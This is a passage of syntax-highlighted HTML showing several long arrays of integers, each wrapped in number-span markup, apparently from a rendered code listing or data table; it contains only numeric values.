class="number">1747073</span>, <span class="number">3315692</span>, <span class="number">2404840</span>, <span class="number">3344307</span>, <span class="number">3058404</span>, <span class="number">1012657</span>, <span class="number">337436</span>, <span class="number">282239</span>, <span class="number">3987438</span>, <span class="number">3563971</span>, <span class="number">3232709</span>, <span class="number">1405828</span>, <span class="number">461145</span>, <span class="number">1246785</span>, <span class="number">1132791</span>, <span class="number">3004771</span>, <span class="number">660781</span>, <span class="number">172717</span>, <span class="number">3190937</span>, <span class="number">3876997</span>, <span class="number">2164256</span>, <span class="number">2070087</span>, <span class="number">3909187</span>, <span class="number">2876423</span>, <span class="number">2804502</span>, <span class="number">2649946</span>, <span class="number">28203</span>, <span class="number">3395597</span>, <span class="number">3364832</span>, <span class="number">4106070</span>, <span class="number">263331</span>, <span class="number">2648126</span>, <span class="number">1600290</span>, <span class="number">721167</span>, <span class="number">3991279</span>, <span class="number">2932850</span>, <span class="number">1816848</span>, <span class="number">1237930</span>, <span class="number">3805917</span>, <span class="number">683434</span>, <span class="number">56233</span>, <span class="number">2234822</span>, <span class="number">2720667</span>, <span class="number">301679</span>, <span class="number">4113339</span>, <span class="number">2938618</span>, <span class="number">2568280</span>, <span class="number">2085721</span>, <span class="number">1870990</span>, <span class="number">3946203</span>, <span class="number">1495215</span>, <span class="number">3487766</span>, <span class="number">916775</span>, <span class="number">1022709</span>, <span class="number">3495902</span>, <span class="number">1916009</span>, <span class="number">283993</span>, <span class="number">2414527</span>, <span class="number">2646368</span>, <span class="number">601247</span>, <span class="number">2633472</span>, <span class="number">1141376</span>, <span class="number">3114228</span>, <span class="number">978394</span>, <span class="number">2534075</span>, <span class="number">2624492</span>, <span class="number">590455</span>, <span class="number">828034</span>, <span class="number">1437948</span>, <span class="number">3805189</span>, <span class="number">2834344</span>], [<span class="number">1704558</span>, <span class="number">816765</span>, <span class="number">3762174</span>, <span class="number">1494750</span>, <span class="number">1314054</span>, <span class="number">3081791</span>, <span class="number">4124342</span>, <span class="number">541062</span>, <span class="number">449851</span>, <span class="number">2310408</span>, <span class="number">2187891</span>, <span class="number">258791</span>, <span class="number">1466525</span>, <span class="number">1033243</span>, <span class="number">1953211</span>, <span class="number">2821936</span>, <span class="number">1326046</span>, <span class="number">2201689</span>, <span class="number">1504898</span>, <span class="number">1188458</span>, <span class="number">1968064</span>, <span class="number">729708</span>, <span class="number">3860108</span>, <span class="number">1748121</span>, <span class="number">445286</span>, <span class="number">2990623</span>, <span class="number">623241</span>, <span class="number">1555763</span>, <span class="number">837271</span>, <span class="number">1024731</span>, <span class="number">3186362</span>, <span class="number">3385837</span>, <span class="number">4040413</span>, <span class="number">717731</span>, <span class="number">2217974</span>, <span class="number">1436441</span>, <span class="number">4089141</span>, <span class="number">2329301</span>, <span class="number">115121</span>, <span class="number">3151348</span>, <span class="number">3927806</span>, <span class="number">2871048</span>, <span class="number">2096694</span>, <span class="number">2148109</span>, <span class="number">2215987</span>, <span class="number">742646</span>, <span class="number">2595695</span>, <span class="number">201314</span>, <span class="number">1196252</span>, <span class="number">4092574</span>, <span class="number">3413334</span>, <span class="number">1566110</span>, <span class="number">1452711</span>, <span class="number">2764185</span>, <span class="number">1843047</span>, <span class="number">2722853</span>, <span class="number">2821082</span>, <span class="number">3936775</span>, <span class="number">94394</span>, <span class="number">154605</span>, <span class="number">3496812</span>, <span class="number">3102180</span>, <span class="number">3668794</span>, <span class="number">1323547</span>, <span class="number">621691</span>, <span class="number">2689849</span>, <span class="number">3942136</span>, <span class="number">703083</span>, <span class="number">3951980</span>, <span class="number">2518921</span>, <span class="number">165811</span>, <span class="number">4039110</span>, <span class="number">3293950</span>, <span class="number">4005581</span>, <span class="number">3989260</span>, <span class="number">302252</span>, <span class="number">1500390</span>, <span class="number">3996893</span>, <span class="number">184110</span>, <span class="number">3568920</span>, <span class="number">2832436</span>, <span class="number">1967628</span>, <span class="number">1872907</span>, <span class="number">1142142</span>, <span class="number">2241968</span>, <span class="number">1837314</span>, <span class="number">4000338</span>, <span class="number">2183446</span>, <span class="number">3666725</span>, <span class="number">2555221</span>, <span class="number">3098309</span>, <span class="number">348421</span>, <span class="number">224049</span>, <span class="number">4131037</span>, <span class="number">513747</span>, <span class="number">4025743</span>, <span class="number">408370</span>, <span class="number">1133043</span>, <span class="number">107358</span>, <span class="number">917065</span>, <span class="number">3112215</span>, <span class="number">4085435</span>, <span class="number">2350218</span>, <span class="number">1200235</span>, <span class="number">2353263</span>, <span class="number">397736</span>, <span class="number">570928</span>, <span class="number">2745875</span>, <span class="number">1625517</span>, <span class="number">986524</span>, <span class="number">405084</span>, <span class="number">2704966</span>, <span class="number">1161971</span>, <span class="number">976713</span>, <span class="number">4007883</span>, <span class="number">1231129</span>, <span class="number">1768281</span>, <span class="number">1649306</span>, <span class="number">3886654</span>, <span class="number">2863786</span>, <span class="number">955169</span>, <span class="number">1241834</span>, <span class="number">3270723</span>, <span class="number">2366932</span>, <span class="number">1518102</span>, <span class="number">1551350</span>, <span class="number">305123</span>, <span class="number">3610014</span>, <span class="number">1417357</span>, <span class="number">119498</span>, <span class="number">2573323</span>, <span class="number">3770262</span>, <span class="number">3274151</span>, <span class="number">1204945</span>, <span class="number">533524</span>, <span class="number">698269</span>, <span class="number">4047049</span>, <span class="number">144159</span>, <span class="number">1733552</span>, <span class="number">1937443</span>, <span class="number">3526562</span>, <span class="number">2728688</span>, <span class="number">3366942</span>, <span class="number">3501818</span>, <span class="number">865077</span>, <span class="number">2972243</span>, <span class="number">349401</span>, <span class="number">692591</span>, <span class="number">3372260</span>, <span class="number">3817253</span>, <span class="number">3814556</span>, <span class="number">2961825</span>, <span class="number">2008053</span>, <span class="number">2231645</span>, <span class="number">1347363</span>, <span class="number">2366615</span>, <span class="number">3538574</span>, <span class="number">2064725</span>, <span class="number">3217945</span>, <span class="number">335197</span>, <span class="number">1625433</span>, <span class="number">3294612</span>, <span class="number">3313807</span>, <span class="number">3103512</span>, <span class="number">3913029</span>, <span class="number">1140</span>, <span class="number">3656003</span>, <span class="number">1300868</span>, <span class="number">960707</span>, <span class="number">2691728</span>, <span class="number">3461722</span>, <span class="number">2076883</span>, <span class="number">2762090</span>, <span class="number">1763491</span>, <span class="number">2659853</span>, <span class="number">2649390</span>, <span class="number">2543718</span>, <span class="number">2776401</span>, <span class="number">2115083</span>, <span class="number">991771</span>, <span class="number">2399598</span>, <span class="number">2898148</span>, <span class="number">983994</span>, <span class="number">2121942</span>, <span class="number">3267972</span>, <span class="number">3419492</span>, <span class="number">1325456</span>, <span class="number">2132297</span>, <span class="number">82758</span>, <span class="number">1037371</span>, <span class="number">2216854</span>, <span class="number">946909</span>, <span class="number">717051</span>, <span class="number">2690649</span>, <span class="number">1527256</span>, <span class="number">3216202</span>, <span class="number">212119</span>, <span class="number">213143</span>, <span class="number">1947188</span>, <span class="number">2019239</span>, <span class="number">1556156</span>, <span class="number">366669</span>, <span class="number">4086440</span>, <span class="number">3805270</span>, <span class="number">3629077</span>, <span class="number">1479207</span>, <span class="number">228876</span>, <span class="number">773062</span>, <span class="number">18116</span>, <span class="number">3825880</span>, <span class="number">2570871</span>, <span class="number">1032612</span>, <span class="number">3786367</span>, <span class="number">3167506</span>, <span class="number">1382747</span>, <span class="number">708805</span>, <span class="number">359386</span>, <span class="number">1092968</span>, <span class="number">265381</span>, <span class="number">832395</span>, <span class="number">1839924</span>, <span class="number">3186779</span>, <span class="number">1446616</span>, <span class="number">130730</span>, <span class="number">1839728</span>, <span class="number">718508</span>, <span class="number">378034</span>, <span class="number">554270</span>, <span class="number">2275993</span>, <span class="number">148025</span>, <span class="number">1677152</span>, <span class="number">1800446</span>, <span class="number">4127956</span>, <span class="number">2214902</span>, <span class="number">2077929</span>, <span class="number">4006828</span>, <span class="number">3345834</span>, <span class="number">1275040</span>, <span class="number">3872820</span>, <span class="number">3017394</span>, <span class="number">603581</span>, <span class="number">2917266</span>, <span class="number">791981</span>, <span class="number">1887610</span>, <span class="number">688591</span>, <span class="number">985010</span>, <span class="number">3732271</span>, <span class="number">1900118</span>, <span class="number">1358876</span>, <span class="number">1549589</span>, <span class="number">1813013</span>, <span class="number">1808563</span>, <span class="number">706400</span>, <span class="number">3935940</span>, <span class="number">1193314</span>, <span class="number">115921</span>], [<span class="number">1274013</span>, <span class="number">3735294</span>, <span class="number">2972120</span>, <span class="number">4059752</span>, <span class="number">2836627</span>, <span class="number">2019431</span>, <span class="number">2586880</span>, <span class="number">3732312</span>, <span class="number">1357547</span>, <span class="number">3539208</span>, <span class="number">1549518</span>, <span class="number">2319645</span>, <span class="number">1735832</span>, <span class="number">713543</span>, <span class="number">2402513</span>, <span class="number">1082102</span>, <span class="number">582150</span>, <span class="number">2355894</span>, <span class="number">2891749</span>, <span class="number">1574407</span>, <span class="number">2360796</span>, <span class="number">194818</span>, <span class="number">4092509</span>, <span class="number">2828740</span>, <span class="number">4151941</span>, <span class="number">2777779</span>, <span class="number">4153191</span>, <span class="number">3084546</span>, <span class="number">665776</span>, <span class="number">478680</span>, <span class="number">1000398</span>, <span class="number">1674356</span>, <span class="number">3203569</span>, <span class="number">2365990</span>, <span class="number">358123</span>, <span class="number">2354367</span>, <span class="number">106370</span>, <span class="number">2270033</span>, <span class="number">732787</span>, <span class="number">169742</span>, <span class="number">1828784</span>, <span class="number">1481625</span>, <span class="number">813489</span>, <span class="number">2477957</span>, <span class="number">1229792</span>, <span class="number">2729352</span>, <span class="number">2866275</span>, <span class="number">2057713</span>, <span class="number">1227326</span>, <span class="number">2195519</span>, <span class="number">2888473</span>, <span class="number">3219172</span>, <span class="number">1877123</span>, <span class="number">3177232</span>, <span class="number">2924673</span>, <span class="number">3895833</span>, <span class="number">3210735</span>, <span class="number">4097704</span>, <span class="number">2741833</span>, <span class="number">3512236</span>, <span class="number">4117152</span>, <span class="number">2909683</span>, <span class="number">2331528</span>, <span class="number">2772270</span>, <span class="number">2564983</span>, <span class="number">3243833</span>, <span class="number">502914</span>, <span class="number">1276486</span>, <span class="number">31250</span>, <span class="number">3162804</span>, <span class="number">858144</span>, <span class="number">3993727</span>, <span class="number">4093294</span>, <span class="number">1988824</span>, <span class="number">3126098</span>, <span class="number">3472528</span>, <span class="number">1543910</span>, <span class="number">639283</span>, <span class="number">4106751</span>, <span class="number">2408836</span>, <span class="number">920223</span>, <span class="number">1619178</span>, <span class="number">4082729</span>, <span class="number">2392804</span>, <span class="number">2988073</span>, <span class="number">1701021</span>, <span class="number">637168</span>, <span class="number">3479362</span>, <span class="number">3539216</span>, <span class="number">3208843</span>, <span class="number">3160628</span>, <span class="number">3304419</span>, <span class="number">1513232</span>, <span class="number">1187076</span>, <span class="number">890760</span>, <span class="number">2723933</span>, <span class="number">1013302</span>, <span class="number">1706643</span>, <span class="number">1990119</span>, <span class="number">914849</span>, <span class="number">3051620</span>, <span class="number">2266231</span>, <span class="number">3167828</span>, <span class="number">1985379</span>, <span class="number">1294763</span>, <span class="number">1013235</span>, <span class="number">691641</span>, <span class="number">614804</span>, <span class="number">908753</span>, <span class="number">1793142</span>, <span class="number">4186308</span>, <span class="number">223077</span>, <span class="number">296466</span>, <span class="number">3094122</span>, <span class="number">375142</span>, <span class="number">3982343</span>, <span class="number">1837355</span>, <span class="number">3269322</span>, <span class="number">859890</span>, <span class="number">3351653</span>, <span class="number">2024995</span>, <span class="number">2850579</span>, <span class="number">3239764</span>, <span class="number">2696780</span>, <span class="number">1932390</span>, <span class="number">2300504</span>, <span class="number">2203648</span>, <span class="number">1115926</span>, <span class="number">2597636</span>, <span class="number">4162550</span>, <span class="number">1997742</span>, <span class="number">1350661</span>, <span class="number">3278081</span>, <span class="number">3708696</span>, <span class="number">692800</span>, <span class="number">1437388</span>, <span class="number">391611</span>, <span class="number">2181932</span>, <span class="number">2764640</span>, <span class="number">906844</span>, <span class="number">1777085</span>, <span class="number">400108</span>, <span class="number">2365510</span>, <span class="number">1381554</span>, <span class="number">2355958</span>, <span class="number">3181617</span>, <span class="number">3455732</span>, <span class="number">1173164</span>, <span class="number">2887967</span>, <span class="number">921139</span>, <span class="number">1781374</span>, <span class="number">1511714</span>, <span class="number">699951</span>, <span class="number">3425562</span>, <span class="number">2867911</span>, <span class="number">169570</span>, <span class="number">874748</span>, <span class="number">2434342</span>, <span class="number">1699422</span>, <span class="number">2981625</span>, <span class="number">2014154</span>, <span class="number">3049470</span>, <span class="number">829940</span>, <span class="number">1235688</span>, <span class="number">3777739</span>, <span class="number">1674803</span>, <span class="number">1168362</span>, <span class="number">4015868</span>, <span class="number">178143</span>, <span class="number">239988</span>, <span class="number">2689798</span>, <span class="number">2611450</span>, <span class="number">2838743</span>, <span class="number">1920275</span>, <span class="number">2807774</span>, <span class="number">2095417</span>, <span class="number">2054441</span>, <span class="number">285765</span>, <span class="number">161435</span>, <span class="number">3628559</span>, <span class="number">3292071</span>, <span class="number">257092</span>, <span class="number">418023</span>, <span class="number">3970008</span>, <span class="number">2149606</span>, <span class="number">1815174</span>, <span class="number">2943903</span>, <span class="number">2190266</span>, <span class="number">4083374</span>, <span class="number">2533108</span>, <span class="number">1804450</span>, <span class="number">2280451</span>, <span class="number">488329</span>, <span class="number">2655258</span>, <span class="number">303725</span>, <span class="number">794834</span>, <span class="number">2985520</span>, <span class="number">3353763</span>, <span class="number">313460</span>, <span class="number">641409</span>, <span class="number">350069</span>, <span class="number">1249795</span>, <span class="number">2518737</span>, <span class="number">1196538</span>, <span class="number">1062469</span>, <span class="number">4117679</span>, <span class="number">2137371</span>, <span class="number">3037576</span>, <span class="number">1525799</span>, <span class="number">1628834</span>, <span class="number">1851259</span>, <span class="number">3605877</span>, <span class="number">17674</span>, <span class="number">2146625</span>, <span class="number">3135852</span>, <span class="number">3846789</span>, <span class="number">3764278</span>, <span class="number">2443989</span>, <span class="number">2575252</span>, <span class="number">1214527</span>, <span class="number">2093221</span>, <span class="number">2528388</span>, <span class="number">1900521</span>, <span class="number">1286708</span>, <span class="number">1117773</span>, <span class="number">2478942</span>, <span class="number">3428491</span>, <span class="number">451114</span>, <span class="number">1164863</span>, <span class="number">4006248</span>, <span class="number">1653957</span>, <span class="number">1169296</span>, <span class="number">2151813</span>, <span class="number">2568214</span>, <span class="number">1207407</span>, <span class="number">3482199</span>, <span class="number">1193504</span>, <span class="number">1249941</span>, <span class="number">306877</span>, <span class="number">1966726</span>, <span class="number">470848</span>, <span class="number">2629118</span>, <span class="number">4092565</span>, <span class="number">1131887</span>, <span class="number">1249531</span>, <span class="number">1477343</span>, <span class="number">2552369</span>, <span class="number">1035404</span>, <span class="number">2284282</span>, <span class="number">2156209</span>, <span class="number">1083999</span>, <span class="number">1582261</span>, <span class="number">117275</span>, <span class="number">3449321</span>, <span class="number">3547909</span>, <span class="number">565898</span>], [<span class="number">755247</span>, <span class="number">2004218</span>, <span class="number">3831019</span>, <span class="number">3310505</span>, <span class="number">377980</span>, <span class="number">3096277</span>, <span class="number">3570211</span>, <span class="number">1274098</span>, <span class="number">4066058</span>, <span class="number">2427810</span>, <span class="number">457273</span>, <span class="number">2880650</span>, <span class="number">2989099</span>, <span class="number">859363</span>, <span class="number">2778606</span>, <span class="number">1773657</span>, <span class="number">210751</span>, <span class="number">40001</span>, <span class="number">1458653</span>, <span class="number">157252</span>, <span class="number">195056</span>, <span class="number">2093708</span>, <span class="number">3369555</span>, <span class="number">2605385</span>, <span class="number">3320275</span>, <span class="number">3749099</span>, <span class="number">1477421</span>, <span class="number">1054171</span>, <span class="number">2772148</span>, <span class="number">638835</span>, <span class="number">87582</span>, <span class="number">2850418</span>, <span class="number">2763904</span>, <span class="number">3982904</span>, <span class="number">1953185</span>, <span class="number">2194746</span>, <span class="number">849749</span>, <span class="number">3065644</span>, <span class="number">1750476</span>, <span class="number">3588117</span>, <span class="number">1676718</span>, <span class="number">2935960</span>, <span class="number">849569</span>, <span class="number">831605</span>, <span class="number">2773794</span>, <span class="number">851833</span>, <span class="number">2623136</span>, <span class="number">3310115</span>, <span class="number">3180557</span>, <span class="number">3742379</span>, <span class="number">3287878</span>, <span class="number">336838</span>, <span class="number">2995874</span>, <span class="number">2832109</span>, <span class="number">544451</span>, <span class="number">2776875</span>, <span class="number">1371686</span>, <span class="number">3989874</span>, <span class="number">3469048</span>, <span class="number">2489362</span>, <span class="number">3007872</span>, <span class="number">1659039</span>, <span class="number">3661677</span>, <span class="number">597109</span>, <span class="number">453864</span>, <span class="number">1023305</span>, <span class="number">3585161</span>, <span class="number">98373</span>, <span class="number">536981</span>, <span class="number">76725</span>, <span class="number">1226337</span>, <span class="number">645920</span>, <span class="number">613436</span>, <span class="number">3357251</span>, <span class="number">3813251</span>, <span class="number">2694057</span>, <span class="number">2096916</span>, <span class="number">2427108</span>, <span class="number">1717671</span>, <span class="number">2321549</span>, <span class="number">2678039</span>, <span class="number">1615981</span>, <span class="number">3748204</span>, <span class="number">264229</span>, <span class="number">597758</span>, <span class="number">447948</span>, <span class="number">2909540</span>, <span class="number">53418</span>, <span class="number">2876859</span>, <span class="number">533811</span>, <span class="number">1500833</span>, <span class="number">2820669</span>, <span class="number">2449890</span>, <span class="number">4176775</span>, <span class="number">3587356</span>, <span class="number">4062670</span>, <span class="number">1943167</span>, <span class="number">477111</span>, <span class="number">534903</span>, <span class="number">3023573</span>, <span class="number">1167975</span>, <span class="number">582820</span>, <span class="number">482747</span>, <span class="number">2294862</span>, <span class="number">67516</span>, <span class="number">588818</span>, <span class="number">2819354</span>, <span class="number">2491476</span>, <span class="number">383064</span>, <span class="number">1318652</span>, <span class="number">1045070</span>, <span class="number">3855672</span>, <span class="number">2139215</span>, <span class="number">1898570</span>, <span class="number">2951153</span>, <span class="number">1572337</span>, <span class="number">702667</span>, <span class="number">212333</span>, <span class="number">574580</span>, <span class="number">460794</span>, <span class="number">1855606</span>, <span class="number">2852606</span>, <span class="number">1395044</span>, <span class="number">509667</span>, <span class="number">1236263</span>, <span class="number">4034804</span>, <span class="number">2068966</span>, <span class="number">2638790</span>, <span class="number">459146</span>, <span class="number">1654870</span>, <span class="number">1211495</span>, <span class="number">581021</span>, <span class="number">2488585</span>, <span class="number">3797276</span>, <span class="number">2352559</span>, <span class="number">2169006</span>, <span class="number">3140976</span>, <span class="number">2507736</span>, <span class="number">3151948</span>, <span class="number">1444374</span>, <span class="number">385704</span>, <span class="number">1335317</span>, <span class="number">3646075</span>, <span class="number">3695509</span>, <span class="number">3108143</span>, <span class="number">898043</span>, <span class="number">2100525</span>, <span class="number">2909814</span>, <span class="number">1571195</span>, <span class="number">2834524</span>, <span class="number">2811040</span>, <span class="number">2776459</span>, <span class="number">3366680</span>, <span class="number">125320</span>, <span class="number">905613</span>, <span class="number">3862065</span>, <span class="number">1417986</span>, <span class="number">3325459</span>, <span class="number">450863</span>, <span class="number">2285111</span>, <span class="number">2177190</span>, <span class="number">2444182</span>, <span class="number">1746113</span>, <span class="number">2154716</span>, <span class="number">2931227</span>, <span class="number">2339897</span>, <span class="number">3499453</span>, <span class="number">721333</span>, <span class="number">787164</span>, <span class="number">3063168</span>, <span class="number">3662338</span>, <span class="number">2291666</span>, <span class="number">830204</span>, <span class="number">3866674</span>, <span class="number">2797918</span>, <span class="number">2136914</span>, <span class="number">1707162</span>, <span class="number">1041618</span>, <span class="number">1620124</span>, <span class="number">2225352</span>, <span class="number">429237</span>, <span class="number">2380555</span>, <span class="number">1763294</span>, <span class="number">3853547</span>, <span class="number">3122862</span>, <span class="number">3062098</span>, <span class="number">415242</span>, <span class="number">776357</span>, <span class="number">3818489</span>, <span class="number">2489764</span>, <span class="number">1096887</span>, <span class="number">830901</span>, <span class="number">1564570</span>, <span class="number">2401505</span>, <span class="number">1069864</span>, <span class="number">884623</span>, <span class="number">1181332</span>, <span class="number">1572787</span>, <span class="number">1197257</span>, <span class="number">1959450</span>, <span class="number">443907</span>, <span class="number">3396089</span>, <span class="number">2490842</span>, <span class="number">3012087</span>, <span class="number">2125059</span>, <span class="number">2187118</span>, <span class="number">2906743</span>, <span class="number">14286</span>, <span class="number">1648350</span>, <span class="number">2233213</span>, <span class="number">1593219</span>, <span class="number">4181966</span>, <span class="number">1252702</span>, <span class="number">410119</span>, <span class="number">493301</span>, <span class="number">1395313</span>, <span class="number">243189</span>, <span class="number">803385</span>, <span class="number">3771209</span>, <span class="number">3614748</span>, <span class="number">9127</span>, <span class="number">1523907</span>, <span class="number">1818452</span>, <span class="number">411528</span>, <span class="number">1600148</span>, <span class="number">1571631</span>, <span class="number">2434551</span>, <span class="number">2009709</span>, <span class="number">1094498</span>, <span class="number">1467100</span>, <span class="number">498250</span>, <span class="number">1455344</span>, <span class="number">326204</span>, <span class="number">3479743</span>, <span class="number">4059392</span>, <span class="number">549688</span>, <span class="number">3267631</span>, <span class="number">1306045</span>, <span class="number">3670452</span>, <span class="number">3794439</span>, <span class="number">355869</span>, <span class="number">3570378</span>, <span class="number">3495735</span>, <span class="number">719508</span>, <span class="number">671307</span>, <span class="number">3738217</span>, <span class="number">357059</span>, <span class="number">1039054</span>, <span class="number">208449</span>, <span class="number">1772139</span>, <span class="number">867671</span>, <span class="number">3128968</span>, <span class="number">1886075</span>, <span class="number">1266478</span>, <span class="number">1105798</span>, <span class="number">2720493</span>], [<span class="number">167668</span>, <span class="number">1289720</span>, <span class="number">3174145</span>, <span class="number">2668897</span>, <span class="number">2245182</span>, <span class="number">2897324</span>, <span class="number">3640126</span>, <span class="number">2970138</span>, <span class="number">4078275</span>, <span class="number">2419137</span>, <span class="number">4069751</span>, <span class="number">94167</span>, <span class="number">3984301</span>, <span class="number">2068362</span>, <span class="number">3769350</span>, <span class="number">859984</span>, <span class="number">2408816</span>, <span class="number">1180603</span>, <span class="number">3090993</span>, <span class="number">1327123</span>, <span class="number">1258763</span>, <span class="number">3097289</span>, <span class="number">2560251</span>, <span class="number">3135340</span>, <span class="number">103577</span>, <span class="number">1285465</span>, <span class="number">3612221</span>, <span class="number">3351607</span>, <span class="number">1286625</span>, <span class="number">1122392</span>, <span class="number">3528752</span>, <span class="number">3444357</span>, <span class="number">33149</span>, <span class="number">1018053</span>, <span class="number">763318</span>, <span class="number">1836353</span>, <span class="number">3461496</span>, <span class="number">3855228</span>, <span class="number">1041594</span>, <span class="number">3469574</span>, <span class="number">2202930</span>, <span class="number">1741106</span>, <span class="number">4111819</span>, <span class="number">3602772</span>, <span class="number">1674254</span>, <span class="number">3870425</span>, <span class="number">2281692</span>, <span class="number">125083</span>, <span class="number">329375</span>, <span class="number">1137666</span>, <span class="number">872658</span>, <span class="number">3444891</span>, <span class="number">1435607</span>, <span class="number">3884526</span>, <span class="number">169522</span>, <span class="number">3047467</span>, <span class="number">2108953</span>, <span class="number">1576539</span>, <span class="number">282492</span>, <span class="number">1243079</span>, <span class="number">1317457</span>, <span class="number">4124534</span>, <span class="number">22679</span>, <span class="number">1323809</span>, <span class="number">4018679</span>, <span class="number">273005</span>, <span class="number">2199705</span>, <span class="number">2272783</span>, <span class="number">1712388</span>, <span class="number">1857873</span>, <span class="number">3457328</span>, <span class="number">728457</span>, <span class="number">1851728</span>, <span class="number">2896802</span>, <span class="number">2137751</span>, <span class="number">439048</span>, <span class="number">3791803</span>, <span class="number">3108365</span>, <span class="number">1123629</span>, <span class="number">386270</span>, <span class="number">2289199</span>, <span class="number">3103220</span>, <span class="number">77624</span>, <span class="number">1799719</span>, <span class="number">2824145</span>, <span class="number">3112980</span>, <span class="number">3120599</span>, <span class="number">2127292</span>, <span class="number">1791982</span>, <span class="number">2115328</span>, <span class="number">5728</span>, <span class="number">2938365</span>, <span class="number">1354666</span>, <span class="number">2042325</span>, <span class="number">2818707</span>, <span class="number">69255</span>, <span class="number">3797583</span>, <span class="number">2956068</span>, <span class="number">3685438</span>, <span class="number">771143</span>, <span class="number">2554169</span>, <span class="number">1168965</span>, <span class="number">380827</span>, <span class="number">3674381</span>, <span class="number">1518679</span>, <span class="number">3456856</span>, <span class="number">1603040</span>, <span class="number">2163600</span>, <span class="number">3286187</span>, <span class="number">169736</span>, <span class="number">2671130</span>, <span class="number">1833134</span>, <span class="number">3933842</span>, <span class="number">357686</span>, <span class="number">3066807</span>, <span class="number">1049899</span>, <span class="number">1633589</span>, <span class="number">1459948</span>, <span class="number">140379</span>, <span class="number">956836</span>, <span class="number">2241494</span>, <span class="number">3373537</span>, <span class="number">2663704</span>, <span class="number">2494642</span>, <span class="number">4162938</span>, <span class="number">1761052</span>, <span class="number">1154798</span>, <span class="number">143167</span>, <span class="number">1968434</span>, <span class="number">968040</span>, <span class="number">4108125</span>, <span class="number">1983144</span>, <span class="number">402566</span>, <span class="number">3168009</span>, <span class="number">2397234</span>, <span class="number">165407</span>, <span class="number">2490927</span>, <span class="number">3494376</span>, <span class="number">2719421</span>, <span class="number">3420239</span>, <span class="number">2347973</span>, <span class="number">772947</span>, <span class="number">3925015</span>, <span class="number">1865001</span>, <span class="number">1692526</span>, <span class="number">3152005</span>, <span class="number">934142</span>, <span class="number">2530941</span>, <span class="number">2706218</span>, <span class="number">850981</span>, <span class="number">1670956</span>, <span class="number">2741854</span>, <span class="number">874952</span>, <span class="number">1332041</span>, <span class="number">661141</span>, <span class="number">4061133</span>, <span class="number">867196</span>, <span class="number">2087801</span>, <span class="number">413322</span>, <span class="number">476745</span>, <span class="number">3898783</span>, <span class="number">3330627</span>, <span class="number">581382</span>, <span class="number">264521</span>, <span class="number">2371146</span>, <span class="number">2321678</span>, <span class="number">4019824</span>, <span class="number">1899036</span>, <span class="number">979998</span>, <span class="number">2378426</span>, <span class="number">2584368</span>, <span class="number">560089</span>, <span class="number">2862208</span>, <span class="number">4047885</span>, <span class="number">2373205</span>, <span class="number">2946203</span>, <span class="number">3680982</span>, <span class="number">3569470</span>, <span class="number">4175512</span>, <span class="number">2496539</span>, <span class="number">3997889</span>, <span class="number">104260</span>, <span class="number">3986423</span>, <span class="number">1423123</span>, <span class="number">3865141</span>, <span class="number">1802011</span>, <span class="number">1598598</span>, <span class="number">4055437</span>, <span class="number">562082</span>, <span class="number">2402573</span>, <span class="number">9057</span>, <span class="number">2793841</span>, <span class="number">585195</span>, <span class="number">3086775</span>, <span class="number">3439111</span>, <span class="number">1757371</span>, <span class="number">966040</span>, <span class="number">617524</span>, <span class="number">997351</span>, <span class="number">1262105</span>, <span class="number">1098465</span>, <span class="number">1380446</span>, <span class="number">2727844</span>, <span class="number">2973170</span>, <span class="number">2128900</span>, <span class="number">3134366</span>, <span class="number">417561</span>, <span class="number">103799</span>, <span class="number">3195484</span>, <span class="number">2788077</span>, <span class="number">2893058</span>, <span class="number">1801432</span>, <span class="number">1397213</span>, <span class="number">2294250</span>, <span class="number">2893825</span>, <span class="number">495485</span>, <span class="number">2071385</span>, <span class="number">3451724</span>, <span class="number">2761511</span>, <span class="number">3767310</span>, <span class="number">3847840</span>, <span class="number">3509553</span>, <span class="number">1147951</span>, <span class="number">1233516</span>, <span class="number">3229394</span>, <span class="number">4046506</span>, <span class="number">3161360</span>, <span class="number">3252432</span>, <span class="number">55594</span>, <span class="number">2218016</span>, <span class="number">3848289</span>, <span class="number">3951560</span>, <span class="number">138048</span>, <span class="number">2193328</span>, <span class="number">2771441</span>, <span class="number">2393652</span>, <span class="number">3079654</span>, <span class="number">786272</span>, <span class="number">2173223</span>, <span class="number">11030</span>, <span class="number">959753</span>, <span class="number">4190129</span>, <span class="number">626937</span>, <span class="number">827</span>, <span class="number">2263436</span>, <span class="number">1590414</span>, <span class="number">3088803</span>, <span class="number">411936</span>, <span class="number">2035004</span>, <span class="number">380574</span>, <span class="number">1588232</span>, <span class="number">269793</span>, <span class="number">3678877</span>, <span class="number">386645</span>, <span class="number">420241</span>, <span class="number">490040</span>], [<span class="number">3029012</span>, <span class="number">2721719</span>, <span class="number">954227</span>, <span class="number">924823</span>, <span class="number">1100366</span>, <span class="number">984994</span>, <span class="number">2591997</span>, <span class="number">3057208</span>, <span class="number">2078901</span>, <span class="number">3601676</span>, <span class="number">3477347</span>, <span class="number">2674034</span>, <span class="number">664420</span>, <span class="number">3513846</span>, <span class="number">359967</span>, <span class="number">1724284</span>, <span class="number">2188176</span>, <span class="number">3567509</span>, <span class="number">1569663</span>, <span class="number">3520234</span>, <span class="number">2181171</span>, <span class="number">2844252</span>, <span class="number">2375557</span>, <span class="number">985779</span>, <span class="number">3397484</span>, <span class="number">822374</span>, <span class="number">2022712</span>, <span class="number">877524</span>, <span class="number">2426153</span>, <span class="number">3246594</span>, <span class="number">2385394</span>, <span class="number">1800921</span>, <span class="number">355470</span>, <span class="number">2951632</span>, <span class="number">1131969</span>, <span class="number">3306766</span>, <span class="number">1009764</span>, <span class="number">2194654</span>, <span class="number">93249</span>, <span class="number">3690590</span>, <span class="number">3993452</span>, <span class="number">215923</span>, <span class="number">1124537</span>, <span class="number">3866113</span>, <span class="number">455368</span>, <span class="number">3674700</span>, <span class="number">410825</span>, <span class="number">2489942</span>, <span class="number">472138</span>, <span class="number">4104028</span>, <span class="number">3339215</span>, <span class="number">1187367</span>, <span class="number">774212</span>, <span class="number">1813788</span>, <span class="number">4137955</span>, <span class="number">2441500</span>, <span class="number">1904066</span>, <span class="number">2578791</span>, <span class="number">3265194</span>, <span class="number">1770403</span>, <span class="number">163841</span>, <span class="number">3267071</span>, <span class="number">2368114</span>, <span class="number">2419581</span>, <span class="number">2001327</span>, <span class="number">4119950</span>, <span class="number">494615</span>, <span class="number">3513622</span>, <span class="number">2956011</span>, <span class="number">2900225</span>, <span class="number">2587497</span>, <span class="number">2334424</span>, <span class="number">853816</span>, <span class="number">1531361</span>, <span class="number">462464</span>, <span class="number">1328729</span>, <span class="number">3232162</span>, <span class="number">710000</span>, <span class="number">1630985</span>, <span class="number">3071446</span>, <span class="number">2579204</span>, <span 